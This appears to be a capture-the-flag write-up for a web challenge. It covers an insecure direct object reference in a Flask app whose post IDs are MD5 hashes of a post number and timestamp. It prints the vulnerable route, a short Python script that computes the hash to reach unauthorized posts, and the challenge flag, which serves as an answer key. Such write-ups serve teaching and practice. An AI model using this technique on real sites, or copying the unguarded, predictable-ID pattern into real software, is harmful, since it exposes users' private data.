# Challenge Name:
Social Media

## Description:
Make sure that your app validates things before they get in.

## Category:
Web

## File:
./dist.zip

## Flag:
`STORM{id0rrrrr_88efdbccaeddea_flag_found}`

## Points:
500

## Author:
k.eii

## PoC
there is a vulnerability in the code.
```
@app.route('/post/<post_id>')
def view_post(post_id):
    cursor = db.cursor()
    cursor.execute('SELECT * FROM posts WHERE id = ?', (post_id,))
    post = cursor.fetchone()
    if post:
        return render_template('post.html', post=post)
    else:
        return "Post not found", 404
```
Vulnerability Analysis

    No Authorization Check:
        The function retrieves a post based solely on the post_id provided in the URL.
        There is no validation to ensure that the user requesting the post is authorized to view it.

    Predictable Post IDs:
        If the post_id is predictable (e.g., generated using MD5 hashes of known data), an attacker can guess or brute-force valid post_id values to access unauthorized posts.


you can notice that the post_id is not validated and it is used to generate a hash. the post id is derived from predictable inputs (post[0] and post[4]), which are the post ID and timestamp.

```hashlib.md5(f"{post[0]}{post[4]}".encode()).hexdigest()```

An attacker can reverse-engineer or brute-force the MD5 hash to access posts they are not authorized to view.

you can generate MD5 hashes for guessed post IDs and timestamps to access unauthorized posts.

```
import hashlib
import time

timestamp = int(time.mktime(time.strptime('2025-01-15 16:05:38', '%Y-%m-%d %H:%M:%S')))
print(f"Timestamp: {timestamp}")
data = f"51{timestamp}"
## 51 is the post id

hash_result = hashlib.md5(data.encode()).hexdigest()

print(f"post id: {hash_result}")
```

after running the code you will get the hash of the post id and timestamp. and you can use it to access the post.